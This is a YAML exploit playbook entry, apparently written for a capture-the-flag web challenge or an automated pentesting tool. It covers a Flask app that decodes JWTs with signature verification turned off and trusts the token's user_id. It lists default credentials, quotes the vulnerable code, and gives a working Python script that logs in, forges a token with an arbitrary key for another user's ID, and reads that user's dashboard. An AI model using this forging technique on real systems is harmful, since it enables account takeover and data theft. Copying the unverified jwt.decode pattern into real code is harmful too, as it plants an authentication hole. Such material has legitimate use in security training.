name: jwt_idor_signature_not_verified
category: web
tags: [jwt, idor, signature_bypass, default_credentials]
indicators:
  - "JWT decode with verify_signature=False"
  - "Token contains enumerable user_id field"
  - "Session check then token user_id overwrites"
  - "Default credentials exist"

tricks:
  - name: "Step 1: Identify default credentials"
    when: "Analyze source code"
    how: "Default account test:test (user_id=10032)"
    payload: |
      username='test', password='test'

  - name: "Step 2: Understand vulnerability"
    when: "Analyze routes.py"
    how: "JWT signature not verified + IDOR via user_id in token"
    payload: |
      # Vulnerable code:
      user_id = session.get('user_id')  # Check session first
      if user_id:
          data = jwt.decode(token, options={'verify_signature':False})
          user_id = data['user_id']  # Overwrite with token value
          user = User.query.get(user_id)  # IDOR!

  - name: "Step 3: Forge JWT token"
    when: "Exploit IDOR"
    how: "Signature not verified, use any key, modify user_id"
    payload: |
      jwt.encode(
          {"username": "flag", "user_id": 10019, "user_type": "customer"},
          "fake_key",
          algorithm="HS256"
      )

  - name: "Step 4: Extract the flag"
    when: "Execute attack"
    how: "Login for session -> Forge JWT -> Access dashboard as target user"
    payload: |
      s = requests.Session()
      s.post(f"{TARGET}/", data={"username": "test"})
      s.post(f"{TARGET}/password/test", data={"password": "test"})
      session_cookie = s.cookies.get("session")

      forged_token = jwt.encode(
          {"username": "flag", "user_id": 10019},
          "fake_key", algorithm="HS256"
      )

      resp = s.get(f"{TARGET}/dashboard", cookies={
          "auth_token": forged_token,
          "session": session_cookie
      })  # Flag in last_name field
